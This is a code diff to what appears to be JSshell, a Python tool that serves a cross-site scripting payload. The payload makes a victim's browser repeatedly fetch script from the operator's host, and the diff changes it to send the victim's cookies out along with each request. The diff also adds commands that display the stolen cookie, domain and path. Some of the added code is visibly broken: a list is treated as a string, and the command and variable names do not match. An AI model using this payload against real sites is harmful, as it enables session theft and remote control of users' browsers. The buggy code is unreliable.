@@ -8,7 +8,7 @@ red = '\033[1;31m'
 white = '\033[1;m'
 blue = '\033[1;34m'
 if sys.platform == 'win32':
-    white = red = white = blue = ''
+    white = red = blue = ''
     
 if sys.version_info < (3, 0):
     input = raw_input
@@ -20,6 +20,9 @@ banner = '''%s    __
 ''' % red
 hp = '''JSshell using javascript code as shell commands. Also supports some commands:
 help                  This help
+domain                The source domain
+path                  The source path
+cookie                The current cookies
 exit, quit            Exit the JS shell'''
 
 
@@ -47,7 +50,7 @@ except:
 gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
-payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},999)>\n' % (blue, host, port)
+payload = '%s<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s/"+document.cookie},999)>\n' % (blue, host, port)
 
 
 print(banner)
@@ -76,6 +79,21 @@ Connection: close
             if buffer == 'exit' or buffer == 'quit':
                 c.close()
                 break
+            elif buffer == 'domain':
+                try:
+                    print(domain)
+                except:
+                    print('Could not get the source domain because the referer has been disabled')
+            elif buffer == 'pwd':
+                try:
+                    print(path)
+                except:
+                    print('Could not get the source path because the referer has been disabled')
+            elif buffer == 'cookie':
+                if len(cookie):
+                    print(cookie)
+                else:
+                    print('No cookies')
             elif buffer == 'help':
                 print(hp)
                               
@@ -93,6 +111,9 @@ Connection: close
 
         
 def main():
+    global cookie
+    global domain
+    global pth
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.bind(('0.0.0.0', port))
@@ -109,6 +130,13 @@ def main():
         
     if 'Accept' in resp and 'HTTP' in resp:
         print ('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
+        reqpth = resp.split('\n')[0].split('/')
+        cookie = reqpth.replace(reqpth[0], '').split(' ')[0]
+        for line in resp.split('\n'):
+            if 'referer' in line.lower():
+                referer = line.lower().replace('referer: ', '')
+                domain = referer.split('/')[3]
+                pth = '/'.join(referer.split('/')[3:])
         if len(cmd):
             c.send(cmd.encode())
             print('%s$ %s%s' % (blue, white, cmd))
